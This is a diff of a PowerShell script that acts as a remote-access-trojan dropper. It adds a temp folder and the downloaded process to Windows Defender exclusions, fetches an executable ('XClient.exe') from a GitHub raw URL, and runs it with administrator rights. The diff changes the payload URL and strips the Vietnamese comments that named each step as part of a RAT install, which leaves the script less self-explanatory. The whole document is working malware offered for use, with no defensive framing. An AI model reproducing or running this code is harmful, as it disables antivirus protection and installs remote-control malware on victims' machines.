@@ -1,18 +1,13 @@
 $systemPath = [System.IO.Path]::Combine($env:temp, "SystemTemp")
 New-Item -Path $systemPath -ItemType Directory -Force
 
-# Chặn Defender scan thư mục
 Add-MpPreference -ExclusionPath $systemPath
 
-# Link tải RAT
-$ratUrl = "https://github.com/minhdmkk6/testz/raw/refs/heads/main/test.exe"
+$ratUrl = "https://github.com/minhdmkk6/t2/raw/refs/heads/main/XClient.exe"
 $ratPath = [System.IO.Path]::Combine($systemPath, "rat_exec.exe")
 
-# Tải file về
 Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
 
-# Bỏ qua Defender cho file RAT
 Add-MpPreference -ExclusionProcess $ratPath
 
-# Chạy với quyền Admin
 Start-Process -FilePath $ratPath -Verb RunAs
